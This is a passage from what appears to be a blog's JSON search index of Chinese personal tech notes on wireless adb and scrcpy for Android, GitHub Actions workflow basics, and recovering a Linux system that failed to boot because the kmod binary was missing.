\u76f8\u5173","text":"","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u65e0\u7ebf\u8fde\u63a5","title":"\u65e0\u7ebf\u8fde\u63a5","text":"<ul> <li>\u5c0f\u7c73\u4e0a\uff0c\u76ee\u524d\u53ea\u6709\u5728\u6709\u7ebf\u8fde\u63a5\u540e\u3002\u4fee\u6539 port \u540e\u624d\u80fd\u8fde\u4e0a\u3002\u5426\u5219\u5c31\u662f connect failed\uff0c\u6216\u8005\u62d2\u7edd 5555\u3002</li> </ul> <pre><code>adb devices\nadb tcpip 5555\nadb connect 172.20.10.3:5555\n</code></pre>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u5b89\u88c5\u8f6f\u4ef6","title":"\u5b89\u88c5\u8f6f\u4ef6","text":"<ul> <li>\u8fdc\u7a0b\u5b89\u88c5\u8f6f\u4ef6</li> </ul> <pre><code>adb install xxx.apk\n</code></pre> <ul> <li>\u8fdc\u7a0b\u5f00\u542f\u5e94\u7528</li> </ul> <pre><code>adb shell pm list package |grep jelly  # \u83b7\u5f97\u5e94\u7528\u5305\u540d\npackage:org.jellyfin.androidtv\n\nadb shell dumpsys package org.jellyfin.androidtv # \u83b7\u5f97\u5e94\u7528activity\nadb shell am start org.jellyfin.androidtv/.ui.startup.StartupActivity # \u5f00\u542f\u5e94\u7528\n</code></pre> <p>\u63a8\u8350\u7684\u684c\u9762\uff1a</p> <ul> <li>\u5f53\u8d1d\u684c\u9762\uff08\u7528\u4e8e TV\uff09</li> <li>novalaunch</li> </ul> <p>Genymobile/scrcpy: Display and control your Android device (github.com)</p> <ul> <li>\u9700\u8981\u5148\u786e\u4fdd adb \u8fde\u63a5\u6210\u529f\u4e86\uff0c\u8fd0\u884c scrcpy \u624d\u4f1a\u6709\u754c\u9762\u3002\uff08\u4e3a\u5565\u4e0d\u662f\u4e00\u4e2a\u754c\u9762\uff0c\u63d0\u793a\u6211 usb \u8fde\u63a5\uff0c\u6216\u8005\u8f93\u5165 ip \u5730\u5740\uff1f\uff09\u8fd8\u6ca1\u6709\u6587\u6863\uff0c\u4ee5\u81f3\u4e8e\u6211\u8fd8\u4ee5\u4e3a\u662f\u5e94\u7528\u6253\u4e0d\u5f00\u3002</li> <li>ws-scrcpy - \u7528\u6d4f\u89c8\u5668\u8fdc\u7a0b\u63a7\u5236 Android \u624b\u673a\uff0c\u5b9e\u73b0\u4e91\u624b\u673a\u6548\u679c - \u5c0f\u4f17\u8f6f\u4ef6 (appinn.com)</li> <li>scrcpy \u7f51\u9875\u7248</li> </ul> <p>scrcpy \u8981\u60f3\u80fd\u591f\u901a\u8fc7\u952e\u9f20\u64cd\u63a7\uff0c\u9700\u8981\u5f00\u542f\u989d\u5916\u8bbe\u7f6e\u3002</p> <ul> <li>\u4f46\u662f tmd\uff0c\u9700\u8981\u767b\u5f55\u5c0f\u7c73\u8d26\u53f7\u3002</li> <li>wcnmd\uff0c\u8fd8\u9700\u8981\u63d2 sim \u5361\u3002</li> </ul> <p>On some devices, you also need to enable\u00a0an additional option <code>USB debugging (Security Settings)</code>\u00a0(this is an item different from\u00a0<code>USB debugging</code>) to control it using a keyboard and mouse. Rebooting the device is necessary once this option is set.</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/","title":"github action \u7f16\u8bd1 openwrt","text":"","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>github action \u57fa\u672c\u6559\u7a0b\uff1aGitHub Actions \u5165\u95e8\u6559\u7a0b - \u962e\u4e00\u5cf0\u7684\u7f51\u7edc\u65e5\u5fd7 (ruanyifeng.com) \u4ece workflow \u6982\u5ff5\u5230\u9ad8\u7ea7\u7528\u6cd5\uff1aAbout workflows - GitHub Docs</p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#workflow-\u57fa\u7840","title":"workflow \u57fa\u7840","text":"<ul> <li>\u53ef\u4ee5\u6709\u591a\u4e2a workflow\uff1aFor example, you can have one workflow to build and test pull requests, another workflow to deploy your application every time a release is created, and still another workflow that adds a label every time someone opens a new issue.</li> </ul>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u8fd0\u884c\u65f6\u673a\u89e6\u53d1\u4e00\u6761-workflow","title":"\u8fd0\u884c\u65f6\u673a\uff08\u89e6\u53d1\u4e00\u6761 workflow\uff09","text":"<ul> <li>Events that occur in your workflow's repository</li> <li>Events that occur outside of GitHub and trigger a\u00a0<code>repository_dispatch</code>\u00a0event on GitHub</li> <li>Scheduled times</li> <li>Manual</li> </ul>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u4f8b\u5b50","title":"\u4f8b\u5b50","text":"<pre><code>name: learn-github-actions\nrun-name: ${{ github.actor }} is learning GitHub Actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - uses: actions/setup-node@v3\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#job-\u4f9d\u8d56-need","title":"job \u4f9d\u8d56 (need)","text":"<pre><code>jobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./setup_server.sh\n  build:\n    needs: setup\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./build_server.sh\n  test:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./test_server.sh\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u91cd\u590d\u6267\u884c-jobmatrix","title":"\u91cd\u590d\u6267\u884c job(matrix)","text":"<p>\u91cd\u590d\u6267\u884c 3 \u6b21\uff0c\u6bcf\u6b21\u4f7f\u7528\u4e0d\u540c nodejs \u7248\u672c</p> <pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node: [12, 14, 16]\n    steps:\n      - uses: actions/setup-node@v3\n        with:\n          node-version: ${{ matrix.node }}\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#stepsrun","title":"steps.run","text":"<p>\u6bcf\u4e2a run \u90fd\u5728\u5355\u72ec\u7684\u8fdb\u7a0b\u4e2d</p> <pre><code>- name: Install Dependencies\n  run: npm install\n\n# multi-line command\n- name: Clean install dependencies and build\n  run: |\n    npm ci\n    npm run build\n\n# working dir\n- name: Clean temp directory\n  run: rm -rf *\n  working-directory: ./temp\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#storagecache-","title":"storage(cache, )","text":"<ul> <li>\u4f7f\u7528 cache \u5b58\u50a8\u4e0d\u7ecf\u5e38\u6539\u53d8\u7684\u5185\u5bb9\uff0c\u5982 npm \u7684\u4f9d\u8d56</li> <li>\u4f7f\u7528 artifacts \u5b58\u50a8\u751f\u6210\u7684\u6587\u4ef6\u4ee5\u4fbf\u5176\u5b83 workflow \u8bbf\u95ee\uff0c\u5982\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6216 log\u3002</li> </ul> <p>cache: Caching dependencies to speed up workflows - GitHub Docs artifacts: Storing workflow data as artifacts - GitHub Docs</p> <p>For example, you can create a\u00a0<code>key</code>\u00a0using an expression that calculates the hash of an npm\u00a0<code>package-lock.json</code>\u00a0file. So, when the dependencies that make up the\u00a0<code>package-lock.json</code>\u00a0file change, the cache key changes and a new cache is automatically created.</p> <pre><code>npm-${{ hashFiles('package-lock.json') }}\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#context-\u548c\u9ed8\u8ba4\u73af\u5883\u53d8\u91cf","title":"Context \u548c\u9ed8\u8ba4\u73af\u5883\u53d8\u91cf","text":"<p>Default environment variables:\u00a0These environment variables exist only on the runner that is executing your job.</p> <p>Contexts:\u00a0You can use most contexts at any point in your workflow, including when\u00a0default variables\u00a0would be unavailable. For example, you can use contexts with expressions to perform initial processing before the job is routed to a runner for execution; this allows you to use a context with the conditional\u00a0<code>if</code>\u00a0keyword to determine whether a step should run</p> <p>\u4f7f\u7528 env \u5b9a\u4e49\u7684\u53d8\u91cf\u65e2\u53ef\u4ee5\u5728 run \u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728 workflow \u6587\u4ef6\u4e2d\u4f7f\u7528\u3002\u5728 run \u4e2d\u4f7f\u7528\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u5e94\u7684 shell \u7684\u683c\u5f0f\u8bfb\u53d6\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 context \u7684\u683c\u5f0f\u8bfb\u53d6\u3002</p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u5b9a\u4e49-environment-variable","title":"\u5b9a\u4e49 environment variable","text":"<pre><code>name: Greeting on variable day\n\non:\n  workflow_dispatch\n\nenv:\n  DAY_OF_WEEK: Monday\n\njobs:\n  greeting_job:\n    runs-on: ubuntu-latest\n    env:\n      Greeting: Hello\n    steps:\n      - name: \"Say Hello Mona it's Monday\"\n        run: echo \"$Greeting $First_Name. Today is $DAY_OF_WEEK!\"\n        env:\n          First_Name: Mona\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u4f7f\u7528-context","title":"\u4f7f\u7528 Context","text":"<p>json \u6570\u636e\u7ed3\u6784\u7684\u5bf9\u8c61\u3002\u5305\u542b\u591a\u79cd\u7c7b\u578b Context\uff1a<code>github, env, jobs, steps, runner, secrets, inputs</code></p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#github","title":"github","text":"<pre><code>{\n  \"token\": \"***\",\n  \"job\": \"dump_contexts_to_log\",\n  \"ref\": \"refs/heads/my_branch\",\n  \"sha\": \"c27d339ee6075c1f744c5d4b200f7901aad2c369\",\n  \"repository\": \"octocat/hello-world\",\n  \"repository_owner\": \"octocat\",\n  \"repositoryUrl\": \"git://github.com/octocat/hello-world.git\",\n  \"run_id\": \"1536140711\",\n  \"run_number\": \"314\",\n  \"retention_days\": \"90\",\n  \"run_attempt\": \"1\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"Context testing\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"push\",\n  \"event\": {\n    ...\n  },\n  \"server_url\": \"https://github.com\",\n  \"api_url\": \"https://api.github.com\",\n  \"graphql_url\": \"https://api.github.com/graphql\",\n  \"ref_name\": \"my_branch\",\n  \"ref_protected\": false,\n  \"ref_type\": \"branch\",\n  \"secret_source\": \"Actions\",\n  \"workspace\": \"/home/runner/work/hello-world/hello-world\",\n  \"action\": \"github_step\",\n  \"event_path\": \"/home/runner/work/_temp/_github_workflow/event.json\",\n  \"action_repository\": \"\",\n  \"action_ref\": \"\",\n  \"path\": \"/home/runner/work/_temp/_runner_file_commands/add_path_b037e7b5-1c88-48e2-bf78-eaaab5e02602\",\n  \"env\": \"/home/runner/work/_temp/_runner_file_commands/set_env_b037e7b5-1c88-48e2-bf78-eaaab5e02602\"\n}\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#env","title":"env","text":"<pre><code>name: Hi Mascot\non: push\nenv:\n  mascot: Mona\n  super_duper_var: totally_awesome\n\njobs:\n  windows_job:\n    runs-on: windows-latest\n    steps:\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Mona\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Octocat\n        env:\n          mascot: Octocat\n  linux_job:\n    runs-on: ubuntu-latest\n    env:\n      mascot: Tux\n    steps:\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Tux\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#steps","title":"steps","text":"<p>\u901a\u8fc7 id \u8bbe\u7f6e step \u6bcf\u6b65\u540d\u5b57\uff0c\u4e4b\u540e\u53ef\u4ee5\u83b7\u5f97\u6bcf\u6b65\u7684 output \u7b49\u4fe1\u606f</p> <p>This example\u00a0<code>steps</code>\u00a0context shows two previous steps that had an\u00a0<code>id</code>\u00a0specified. The first step had the\u00a0<code>id</code>\u00a0named\u00a0<code>checkout</code>, the second\u00a0<code>generate_number</code>. The\u00a0<code>generate_number</code>\u00a0step had an output named\u00a0<code>random_number</code>.</p> <pre><code>{\n  \"checkout\": {\n    \"outputs\": {},\n    \"outcome\": \"success\",\n    \"conclusion\": \"success\"\n  },\n  \"generate_number\": {\n    \"outputs\": {\n      \"random_number\": \"1\"\n    },\n    \"outcome\": \"success\",\n    \"conclusion\": \"success\"\n  }\n}\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#runner","title":"runner","text":"<pre><code>{\n  \"os\": \"Linux\",\n  \"arch\": \"X64\",\n  \"name\": \"GitHub Actions 2\",\n  \"tool_cache\": \"/opt/hostedtoolcache\",\n  \"temp\": \"/home/runner/work/_temp\"\n}\n</code></pre> <p>secrets</p> <p><code>GITHUB_TOKEN</code>\u00a0is a secret that is automatically created for every workflow run, and is always included in the\u00a0<code>secrets</code>\u00a0context</p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/","title":"\u8bb0\u4e00\u6b21 linux \u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b","text":"","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u6211\u60f3\u8981\u628a\u7b2c\u4e8c\u5f20\u663e\u5361\u4e5f\u76f4\u901a\u7ed9\u865a\u62df\u673a\uff0c\u7136\u540e\u5c31\u81ea\u5df1\u7f16\u8bd1\u4e86\u4e00\u4e2a\u6253\u4e86 acs overide patch \u7684\u5185\u6838\u3002\u4e4b\u540e\u542f\u52a8\u4e5f\u6ca1\u6709\u95ee\u9898\u3002\u4f46\u662f\u5f53\u6211\u7b2c\u4e00\u6b21\u8fd0\u884c\u865a\u62df\u673a\u540e\uff0c\u7535\u8111\u5c31\u5361\u6b7b\u4e86\u3002\u7136\u540e\u6211\u5f3a\u5236\u5173\u673a\u540e\uff0c\u65e0\u6cd5\u8fdb\u5165\u7cfb\u7edf\uff0c\u800c\u8fdb\u5165\u4e86 busybox initramfs \u4ea4\u4e92\u547d\u4ee4\u884c\u3002\u63d0\u793a\u6587\u4ef6\u7cfb\u7edf\u9519\u8bef\uff0c\u8ba9\u6211 fsck \u7cfb\u7edf\u76d8\u3002\u6211\u7167\u505a\u540e\u5c31\u6210\u529f\u8fdb\u5165\u7cfb\u7edf\u4e86\u3002</p> <ul> <li>\u8fd9\u91cc\u8fdb\u5165\u7cfb\u7edf\u540e\u4e00\u5207\u6b63\u5e38\uff0c\u4f46\u662f lxc \u7684 storage \u663e\u793a unavailable\uff0czpool import zfs_lxd.img \u663e\u793a\u635f\u574f\u3002</li> </ul> <p>\u7136\u540e\u6211\u60f3\u518d\u8bd5\u8bd5\uff0c\u7ed3\u679c\u542f\u52a8\u865a\u62df\u673a\u540e\u53c8\u5361\u6b7b\u4e86\u3002\u6211\u5f3a\u5236\u91cd\u542f\u540e\uff0c\u597d\u50cf\u53c8\u8fdb\u5165 busybox \u8fdb\u884c fsck \u4e86\uff0c\u4f46\u7ed3\u679c\u8fd8\u662f\u8fdb\u4e0d\u4e86\u7cfb\u7edf\uff0c\u8fd9\u6b21\u8fdb\u5165\u4e86\u7d27\u6025\u6a21\u5f0f\u3002</p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u8fc7\u7a0b","title":"\u8fc7\u7a0b","text":"","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u7d27\u6025emergency-\u6a21\u5f0f","title":"\u7d27\u6025\uff0cemergency \u6a21\u5f0f","text":"<p>\u4e3b\u8981\u7684\u62a5\u9519\u662f<code>FAT-fs IO charset iso8895-1 not found</code>\uff0c \u63d0\u793a\u8ba9\u6211\u767b\u5f55\u67e5\u770b\u65e5\u5fd7\uff0c\u6211\u767b\u5f55\u540e df -h\uff0c\u53d1\u73b0\u786e\u5b9e efi \u5206\u533a\u662f\u6ca1\u6709\u6302\u8f7d\u7684\u3002\u7d27\u6025\u6a21\u5f0f\u4e0b\uff0c\u5176\u5b83\u547d\u4ee4\u597d\u50cf\u90fd\u6ca1\u5565\u95ee\u9898\uff0czsh \u7684\u914d\u7f6e\u90fd\u662f\u6211\u7684 oh-my-zsh\u3002 </p> <p>\u7f51\u4e0a\u6709\u4e00\u6837\u7684\u62a5\u9519</p> <ul> <li>boot - 16.04 - stuck in emergency mode - FAT-fs (nvme0n1p1): IO charset iso8859-1 not found - Ask Ubuntu</li> <li>mount - Restore /boot/efi - Ask Ubuntu</li> </ul> <p>\u4f46\u662f\u4ed6\u4eec\u63d0\u5230\u7684\u8fdb\u5165\u6062\u590d\u6a21\u5f0f\uff0c\u7136\u540e\u8fd0\u884c depmod\uff0c\u6211\u65e0\u6cd5\u505a\u5230\uff1a</p> <ul> <li>\u6211\u4e0d\u77e5\u9053\u600e\u4e48\u8fdb\u5165\u6062\u590d\u6a21\u5f0f\uff0c\u56e0\u4e3a\u6211\u91cd\u542f\u5c31\u4f1a\u8fdb\u5165\u8fd9\u4e2a\u7d27\u6025\u6a21\u5f0f\u65e0\u9650\u5faa\u73af<ul> <li>\u5176\u5b9e\u662f\u56e0\u4e3a\u6211\u628a grub \u8bbe\u7f6e\u4e3a hidden \u5e76\u4e14\u5ef6\u8fdf\u4e3a 0\uff0c\u5f00\u542f\u540e\u5c31\u53ef\u4ee5\u8fdb\u5165 grub \u754c\u9762\u9009\u62e9\u5185\u6838\u7248\u672c\u4ee5\u53ca\u7d27\u6025\u6a21\u5f0f</li> </ul> </li> <li>\u5728\u7d27\u6025\u6a21\u5f0f\u4e2d\u6211\u65e0\u6cd5 fsck \u7cfb\u7edf\u76d8\uff0c\u56e0\u4e3a\u5df2\u7ecf\u6302\u8f7d\u4e86\uff08efi \u5206\u533a\u53ef\u4ee5\uff0c\u4f46\u662f\u6ca1\u6709\u9519\u8bef\uff09</li> <li>\u7d27\u6025\u6a21\u5f0f\u4e2d\u65e0\u6cd5\u8fd0\u884c depmod \u547d\u4ee4\uff08\u8fd9\u91cc\u5176\u5b9e\u5df2\u7ecf\u53cd\u6620\u95ee\u9898\u4e86\uff09</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5e0c\u671blivecd-\u4fee\u590d","title":"\u5e0c\u671b\uff0clivecd \u4fee\u590d","text":"<p>\u6211\u4ee5\u4e3a\u662f efi \u5206\u533a\u635f\u574f\u4e86\uff0c\u5728\u53cd\u590d fsck \u65e0\u6548\u540e\uff0c\u6211\u51b3\u5b9a\u91cd\u5efa efi \u5206\u533a\u3002\u4e8e\u662f\u901a\u8fc7 U \u76d8\u8fdb\u5165\u4e86 ubuntu20 \u7684 livecd\uff0822 \u7248\u672c\u542f\u52a8\u5f88\u6162\uff09</p> <pre><code>gparted\u683c\u5f0f\u5316\u5e76\u91cd\u5efa\u5206\u533a\n\n# \u6302\u8f7defi\u5206\u533a\u548c\u7cfb\u7edf\u5206\u533a\nmount /dev/nvmexxx   /xxx\nmount /dev/nvmexxx   /xxx/boot/efi\n\ncd /xxx\nmount -t proc /proc proc\nmount --rbind /sys sys\nmount --rbind /dev dev\n\nchroot /xxx\n\n# \u66f4\u65b0efi\u5206\u533aUUID\uff08\u683c\u5f0f\u5316\u540e\u6539\u53d8\uff09\nvim /etc/fstab\n\nupdate-grub\ngrub-install\n</code></pre> <p>\u53d1\u73b0\u5728 chroot \u7cfb\u7edf\u91cc\u4e5f\u65e0\u6cd5\u8fd0\u884c<code>depmod, modeprobe</code>\u7b49\u547d\u4ee4\uff0c\u63d0\u793a\u6211\u5b89\u88c5<code>zmod</code>\uff0c\u4f46\u662f\u5b89\u88c5\u65f6\u53c8\u544a\u8bc9\u6211\u5df2\u7ecf\u5b89\u88c5\u4e86\u3002\uff08\u8fd9\u91cc\u53c8\u518d\u6b21\u53cd\u6620\u4e86\u95ee\u9898\u6240\u5728\uff09</p> <p>\u91cd\u5efa efi \u5206\u533a\u540e\u4f9d\u7136\u8fd8\u662f\u5361\u5728\u7d27\u6025\u6a21\u5f0f\u3002 </p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5c1d\u8bd5grub-recovery-\u6a21\u5f0f","title":"\u5c1d\u8bd5\uff0cgrub recovery \u6a21\u5f0f","text":"<p>\u4fee\u6539 grub \u914d\u7f6e\u540e\uff0c\u53ef\u4ee5\u8fdb\u5165 grub \u83dc\u5355\u4e86\u3002 \u6211\u5c1d\u8bd5 grub \u9009\u62e9\u65e7\u7684\u5185\u6838\u7684 recovery \u6a21\u5f0f\uff0c\u4f46\u662f\u5374\u5f88\u4e0d\u7a33\u5b9a\uff0c\u51e0\u4e4e\u7acb\u523b\u53c8\u4f1a\u8fdb\u5165\u7d27\u6025\u6a21\u5f0f\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8fd0\u884c\u6587\u5b57\u83dc\u5355\u4e2d\u3002</p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u89e3\u51b3kmod-\u4e0d\u7ffc\u800c\u98de","title":"\u89e3\u51b3\uff0ckmod \u4e0d\u7ffc\u800c\u98de","text":"<p>\u548c czw \u8ba8\u8bba\uff0c\u590d\u76d8\u4e86\u4e0b\u6574\u4e2a\u8fc7\u7a0b\uff0c\u5e76\u7ec8\u4e8e\u53d1\u73b0\u95ee\u9898\u6240\u5728\uff1a</p> <p>\u65e0\u6cd5\u6302\u8f7d efi \u5206\u533a &lt;- iso8895 \u9519\u8bef &lt;- nls_iso8895-1.ko \u4e0d\u5b58\u5728 &lt;- find /lib/module/\u81ea\u5df1\u7f16\u8bd1\u7684\u5185\u6838/\uff0c\u53d1\u73b0ko\u6587\u4ef6\u662f\u5b58\u5728\u7684\u3002 modprobe \u547d\u4ee4\u65e0\u6cd5\u8fd0\u884c &lt;- \u53d1\u73b0 modprobe \u662f\u4e00\u4e2a\u94fe\u63a5\u6307\u5411/bin/kmod\uff0c\u5e76\u4e14\u662f\u7ea2\u8272\u7684\uff0c\u8868\u793a\u94fe\u63a5\u662f\u65e0\u6548\u7684\u3002 &lt;- \u53d1\u73b0/bin/kmod \u6587\u4ef6\u4e0d\u5b58\u5728\uff01</p> <p>\u4e8e\u662f\u4ece czw \u7684\u673a\u5668\u4e0a\u62f7\u8d1d\u4e86\u4e00\u4efd kmod \u6587\u4ef6\uff0c\u7ed3\u679c\u6062\u590d\u6a21\u5f0f\u53ef\u4ee5\u8fdb\u5165\u4e86\uff0c\u673a\u5668\u4e5f\u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\u3002</p> <ul> <li>p.s \u53d1\u73b0 lxc zfs pool \u53c8\u635f\u574f\u4e86</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#linux-\u542f\u52a8\u8fc7\u7a0b","title":"linux \u542f\u52a8\u8fc7\u7a0b","text":"<p>Arch boot process - ArchWiki (archlinux.org) Understanding the Boot process \u2014 BIOS vs UEFI (linuxhint.com)</p> <p>OS \u542f\u52a8\u8fc7\u7a0b\uff1a</p> <ul> <li>\u56fa\u4ef6\uff1aCPU \u6700\u5f00\u59cb\u6267\u884c\u7684\u6307\u4ee4\u3002\u4e3b\u8981\u5de5\u4f5c POST \u81ea\u68c0\uff0c\u786c\u4ef6\u521d\u59cb\u5316\uff0c\u52a0\u8f7d\u5f15\u5bfc\u7a0b\u5e8f</li> <li>\u5f15\u5bfc\u7a0b\u5e8f\uff1a\u52a0\u8f7d os \u5185\u6838\uff08\u53ef\u4ee5\u6307\u5b9a\u5185\u6838\u53c2\u6570\u3001\u521d\u59cb\u6587\u4ef6\u7cfb\u7edf\uff09</li> <li>\u5185\u6838\uff1a<ul> <li>\u521d\u59cb\u5316\uff0c\u5982\u786c\u4ef6\u521d\u59cb\u5316\uff0c\u9a71\u52a8\u52a0\u8f7d</li> <li>init\uff1a\u7528\u6237\u7a7a\u95f4\u521d\u59cb\u5316\u30021-6 \u4e0d\u540c run level\uff0c\u5982 level 1 \u4e3a single user\uff0clevel 3 \u4e3a\u591a\u7528\u6237\u547d\u4ee4\u884c\uff0clevel 5 \u5305\u542b\u56fe\u5f62\u5316\u754c\u9762<ul> <li>p.s level 6 \u4e3a reboot</li> </ul> </li> </ul> 